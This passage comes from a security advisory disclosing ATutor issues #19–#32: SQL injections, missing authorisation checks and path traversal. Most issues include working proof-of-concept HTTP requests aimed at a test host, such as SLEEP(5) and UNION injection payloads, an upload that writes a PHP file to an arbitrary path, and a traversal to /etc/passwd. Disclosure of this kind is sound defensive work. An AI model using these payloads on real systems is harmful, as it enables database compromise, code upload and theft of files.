+that would normally end the choice string literal in the SQL query. This me=
+ans
+that the next choice's single quotation mark will actually end the string
+literal, allowing the next choice value to inject arbitrary SQL into the
+query.
+
+Issue code location: mods/_standard/polls/tools/add.php:45
+
+Exploitable by: Instructors
+
+POC HTTP request:
+| POST /atutor/mods/_standard/polls/tools/add.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Diru2n1iqrbagv31pe4ffln3eb5
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 237
+|
+| add_poll=3Dtrue&question=3Da&c1=3DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'&c2=3D,0,SLEEP=
+(5),0,0,0,0,0,0,0,0,0,0,0)--%01
+
+
+---------------------------------------------------------------------------=
+---
+Issue #20: Poll editing SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when editing existing polls. The POST
+parameters for the poll's choices (starting with "c" and followed by a numb=
+er)
+from the edit request are not escaped before being interpolated into a poll
+updating query, allowing the query to be broken out of.
+
+Issue code location: mods/_standard/polls/tools/edit.php:49
+
+Exploitable by: Instructors
+
+POC HTTP request:
+| POST /atutor/mods/_standard/polls/tools/edit.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dericd783bksknn6rpbbs694ga7
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 142
+|
+| edit_poll=3Dtrue&poll_id=3D1&question=3Da&c1=3D',choice1%3dSLEEP(5),choic=
+e3%3d'&c2=3Dx
+
+
+---------------------------------------------------------------------------=
+---
+Issue #21: Social application deletion SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when deleting social applications. T=
+he
+"apps" POST parameter array from the deletion request, while being escaped
+before interpolation into a SQL query that performs the removal, is not
+interpolated in a context where the escaping is suitable. Namely, the
+parameter is interpolated in the context of a "IN (...)" SQL clause but
+escaped as if it were to be interpolated in the context of the content of a
+string literal. Hence, it is possible to break out and inject arbitrary SQL.
+
+Issue code location: mods/_standard/social/lib/classes/
+|                      Applications.class.php:83
+
+Exploitable by: Administrators, instructors, students and public users
+
+POC HTTP request:
+| POST /atutor/mods/_standard/social/admin/delete_applications.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dpu2bmb9n747rnr19jnv62ka6t2
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 24
+|
+| delete=3D1&apps[]=3DSLEEP(5)
+
+
+---------------------------------------------------------------------------=
+---
+Issue #22: Social profile editing SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when editing the "additional
+information" fields of a user's social profile (namely "interests",
+"associations", "awards", "expertise" and "others"). The parameters to the
+call to Member::updateAdditionalInformation are not escaped before
+interpolation into a social profile update query, allowing the query to be
+broken out of.
+
+Issue code locations:
+| mods/_standard/social/lib/classes/Member.class.php:261
+| mods/_standard/social/lib/classes/Member.class.php:264
+| mods/_standard/social/lib/classes/Member.class.php:267
+| mods/_standard/social/lib/classes/Member.class.php:270
+| mods/_standard/social/lib/classes/Member.class.php:274
+
+Exploitable by: Administrators, instructors and students
+
+POC HTTP request:
+| POST /atutor/mods/_standard/social/edit_profile.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dts1n8pp4rdepdq86etton7jql4
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 39
+|
+| interests=3D%27,associations=3DSLEEP(5),awards=3D'&add=3Dinterests&submit=
+=3DSave
+
+
+---------------------------------------------------------------------------=
+---
+Issue #23: Test question preview SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when previewing test questions. The
+"qid" GET parameter from the preview request, while being escaped before
+interpolation into a SQL query that performs the query, is not interpolated=
+ in
+a context where the escaping is suitable. Namely, the parameter is
+interpolated in the context of a "IN (...)" SQL clause but escaped as if it
+were to be interpolated in the context of the content of a string literal.
+Hence, it is possible to break out and inject arbitrary SQL.
+
+Issue code location: mods/_standard/tests/preview_question.php:36
+
+Exploitable by: Instructors
+
+POC URL: http://atutor-test/atutor/mods/_standard/tests/preview_question.ph=
+p?qid=3D0%29%20UNION%20ALL%20SELECT%20NULL,NULL,1,4,NULL,SLEEP(5),NULL,NULL=
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL=
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL=
+,NULL--%01
+
+
+---------------------------------------------------------------------------=
+---
+Issue #24: Test result listing SQL injection
+---------------------------------------------------------------------------=
+---
+There is a SQL injection vulnerability when listing a test's results. The
+"start_date" and "end_date" POST parameters from the listing request are not
+fully validated nor escaped before interpolation into a search query, allow=
+ing
+the query to be broken out of.
+
+Issue code locations:
+| mods/_standard/tests/results_all.php:189
+| mods/_standard/tests/results_all.php:190
+
+Exploitable by: Instructors
+
+POC HTTP request:
+| POST /atutor/mods/_standard/tests/results_all.php?tid=3D1 HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dnujdavomkp7mft095liogvfrv1
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 104
+|
+| start_date=3D2000-01-01%27+AND+SLEEP(5)+AND+%27%27%3D%27&end_date=3D&user=
+_type=3D0&filter=3DFilter&test_id=3D1
+
+
+---------------------------------------------------------------------------=
+---
+Issue #25: Content menu inline title editing missing authorisation check
+---------------------------------------------------------------------------=
+---
+Course instructors are allowed to edit the titles of content items directly
+from the course's sidebar using the inline editing function.  However, there
+is no authorisation check on the server-side portion of this functionality,
+allowing any logged in user to edit the titles of any content (regardless of
+course).
+
+Issue code location: mods/_core/content/menu_inline_editor_submit.php
+
+Exploitable by: Students
+
+POC HTTP request:
+| POST /atutor/mods/_core/content/menu_inline_editor_submit.php HTTP/1.1
+| Host: atutor-test
+| Content-Type: application/x-www-form-urlencoded
+| X-Requested-With: XMLHttpRequest
+| Cookie: ATutorID=3D4c0hnc11npfvi7opgujsohora6
+| Content-Length: 23
+| Connection: keep-alive
+|
+| field=3D-1&value=3DModified
+
+
+---------------------------------------------------------------------------=
+---
+Issue #26: Course file upload path traversal and extension check bypass
+---------------------------------------------------------------------------=
+---
+Instructors can upload files to a course's file collection. The extension of
+this file is checked to make sure it does not match a blacklisted extension
+(i.e., ".php"). However, this check can be bypassed by the fact that after =
+the
+blacklist check is passed, certain blacklisted characters are removed from =
+the
+filename. Hence, if one of these characters was inserted into an extension
+that would otherwise be blacklisted, this will allow the adjusted extension=
+ to
+bypass the initial blacklist check before being modified into the original
+blacklisted extension. In addition, the "pathext" POST parameter from the f=
+ile
+upload request is used in the construction of the destination path for the
+uploaded file. This parameter is not sanitised or escaped in any way, allow=
+ing
+a simple path traversal. Combined, these two vulnerabilities allow instruct=
+ors
+to upload files with arbitrary extensions to arbitrary locations on the
+server's filesystem.
+
+Issue code locations:
+| mods/_core/file_manager/upload.php:48
+| mods/_core/file_manager/upload.php:81
+
+Exploitable by: Instructors
+
+POC HTTP request:
+| POST /atutor/mods/_core/file_manager/upload.php?popup=3D0&framed=3D0&cp=
+=3D&pid=3D&cid=3D0&a_type=3D0
+HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dpr6iltsm3h1hfv9vkf4brrena4
+| Connection: keep-alive
+| Content-Type: multipart/form-data; boundary=3D--------1366665938
+| Content-Length: 426
+|
+| ----------1366665938
+| Content-Disposition: form-data; name=3D"MAX_FILE_SIZE"
+|
+| 10485760
+| ----------1366665938
+| Content-Disposition: form-data; name=3D"uploadedfile"; filename=3D"foo.ph=
+,p"
+| Content-Type: image/jpeg
+|
+| <?php phpinfo() ?>
+| ----------1366665938
+| Content-Disposition: form-data; name=3D"submit"
+|
+| Upload
+| ----------1366665938
+| Content-Disposition: form-data; name=3D"pathext"
+|
+| ../../www/foodir/
+| ----------1366665938--
+
+
+---------------------------------------------------------------------------=
+---
+Issue #27: Session member ID SQL injection
+---------------------------------------------------------------------------=
+---
+Users can login to ATutor using auto-login functionality. In this case, the
+user's numeric member ID and associated auto-login code are provided in a
+request to the login handler in order to perform the auto-login. However, t=
+he
+member ID is not sanitised before it is stored in the user's session data if
+the login succeeds. Since the member ID is forced to be treated as an integ=
+er
+in the login check SQL query, it is possible to perform an auto-login with a
+given member ID number, but then have arbitrary content also stored in the
+user's session member ID. Through this arbitrary content, it is possible to
+then go on and perform SQL injections in future queries that interpolate the
+user's session member ID without proper escaping.
+
+Issue code locations:
+| Part 1: confirm.php:154
+| Part 2 (example): mods/_standard/forums/module_news.php:26 (example SQL
+|                   query that then uses session member ID without escaping)
+
+Exploitable by: Users
+
+POC URL: http://atutor-test/atutor/confirm.php?auto_login=3D1&member_id=3D4=
+%27+INJECTION&code=3Df38415fa37
+
+
+---------------------------------------------------------------------------=
+---
+Issue #28: Gradebook grade editing SQL injection
+---------------------------------------------------------------------------=
+---
+When a grade in a gradebook is edited, the raw grade percentage value is
+converted into the final grade depending on the grade scale associated with
+the test. This converted value is then interpolated into a SQL query that
+updates the grade. However, this converted grade is not escaped before
+interpolation into the query; thus, it is possible to break out of the query
+by assigning a raw percentage grade that leads to a converted grade with
+quotation marks in it. For example, it is possible to create a test with a
+grade scale that maps raw percentage grades from 0% to 100% (all possible
+values) to the grade "' || SLEEP(5) || '". When a grade is then set in the
+test to any percentage value (or the grade "' || SLEEP(5) || '" itself), the
+query will be injected into with the mapped grade value.
+
+Issue code location: mods/_standard/gradebook/edit_marks.php:43
+
+Exploitable by: Instructors
+
+POC HTTP requests:
+| Part 1:
+|     POST /atutor/mods/_standard/gradebook/grade_scale_edit.php?grade_scal=
+e_id=3D4
+HTTP/1.1
+|     Host: atutor-test
+|     Cookie: ATutorID=3Der9q94j4gp1itvv7tpca84uel3
+|     Connection: keep-alive
+|     Content-Type: application/x-www-form-urlencoded
+|     Content-Length: 777
+|
+|     grade_scale_id=3D4&action=3Dedit&selected_grade_scale_id=3D0&scale_na=
+me=3Dx&scale_value%5B0%5D=3D%27+%7C%7C+SLEEP%285%29+%7C%7C+%27&percentage_f=
+rom%5B0%5D=3D0&percentage_to%5B0%5D=3D100&scale_value%5B1%5D=3D&percentage_=
+from%5B1%5D=3D&percentage_to%5B1%5D=3D&scale_value%5B2%5D=3D&percentage_fro=
+m%5B2%5D=3D&percentage_to%5B2%5D=3D&scale_value%5B3%5D=3D&percentage_from%5=
+B3%5D=3D&percentage_to%5B3%5D=3D&scale_value%5B4%5D=3D&percentage_from%5B4%=
+5D=3D&percentage_to%5B4%5D=3D&scale_value%5B5%5D=3D&percentage_from%5B5%5D=
+=3D&percentage_to%5B5%5D=3D&scale_value%5B6%5D=3D&percentage_from%5B6%5D=3D=
+&percentage_to%5B6%5D=3D&scale_value%5B7%5D=3D&percentage_from%5B7%5D=3D&pe=
+rcentage_to%5B7%5D=3D&scale_value%5B8%5D=3D&percentage_from%5B8%5D=3D&perce=
+ntage_to%5B8%5D=3D&scale_value%5B9%5D=3D&percentage_from%5B9%5D=3D&percenta=
+ge_to%5B9%5D=3D&submit=3DSave
+| Part 2: http://atutor-test/atutor/mods/_standard/gradebook/edit_marks.php=
+?filter=3D&gradebook_test_id=3D&member_id=3D&p=3D1&save=3DSave&grade_3_4=3D=
+0%25&grade_3_2=3D
+
+
+---------------------------------------------------------------------------=
+---
+Issue #29: Social application deletion missing authorisation check
+---------------------------------------------------------------------------=
+---
+Administrators are able to delete existing social applications.  However, no
+authorisation check is performed on this operation, allowing any user to
+perform similar social application deletions.
+
+Issue code location: mods/_standard/social/admin/delete_applications.php
+
+Exploitable by: Instructors and students
+
+
+---------------------------------------------------------------------------=
+---
+Issue #30: Module moving missing authorisation check
+---------------------------------------------------------------------------=
+---
+Instructors are able to adjust the ordering of the modules for their course.
+However, no authorisation check is performed on this operation, allowing any
+user to perform similar moving of modules in a course.
+
+Issue code location: move_module.php
+
+Exploitable by: Students
+
+
+---------------------------------------------------------------------------=
+---
+Issue #31: Alternative content saving/deletion missing authorisation check
+---------------------------------------------------------------------------=
+---
+Instructors are able to save or delete existing alternative content (second=
+ary
+resources). However, no authorisation check is performed on this operation,
+allowing any user to perform similar alternative content adjustments.
+
+Issue code locations:
+| mods/_core/editor/remove_alternative.php
+| mods/_core/editor/save_alternative.php
+
+Exploitable by: Students
+
+
+---------------------------------------------------------------------------=
+---
+Issue #32: Course icon retrieval path traversal
+---------------------------------------------------------------------------=
+---
+Instructors are able to modify a course's icon that is used to represent the
+course in listings. This icon can either be an ATutor-provided icon or a
+custom uploaded one. If an ATutor-provided icon is to be used, the path to =
+the
+icon on the filesystem is given in the request to set the course icon.
+However, this path is not sanitised before being set; hence it is possible =
+to
+set the icon to refer to any file on the filesystem. When the course icon is
+then retrieved in a subsequent request to the course icon retrieval URL, the
+contents of this file will be disclosed to the user.
+
+Issue code locations:
+| Part 1: mods/_core/courses/lib/courses.inc.php:50
+| Part 2: get_course_icon.php:32 (subsequent disclosure of file)
+
+Exploitable by: Instructors
+
+POC HTTP request (for part 1):
+| POST /atutor/mods/_core/properties/course_properties.php HTTP/1.1
+| Host: atutor-test
+| Cookie: ATutorID=3Dvhca1dlkjpu42klhakbqk38d23
+| Connection: keep-alive
+| Content-Type: application/x-www-form-urlencoded
+| Content-Length: 596
+|
+| form_course=3Dtrue&MAX_FILE_SIZE=3D819200&course=3D1&old_access=3Dpublic&=
+created_date=3D2016-03-26+13%3a19%3a03&show_courses=3D0&current_cat=3D0&tit=
+le=3Dtest&pri_lang=3Den&description=3D%0d&category_parent=3D0&content_packa=
+ging=3Dtop&rss=3D0&access=3Dpublic&release_date=3D0&day_release=3D1&month_r=
+elease=3D1&year_release=3D2016&hour_release=3D0&min_release=3D0&end_date=3D=
+0&day_end=3D1&month_end=3D1&year_end=3D2017&hour_end=3D0&min_end=3D0&setvis=
+ual=3D1&banner=3D%0d&quota=3D-2&filesize=3D-3&tracking=3D%0d&copyright=3D%0=
+d&boolForce=3D%0d&icon=3D..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&MAX_FIL=
+E_SIZE=3D819200&customicon=3D%0d&custOptCount=3D0&courseId=3D1&submit=3DSave
+
+
+- Matthew Daley
+
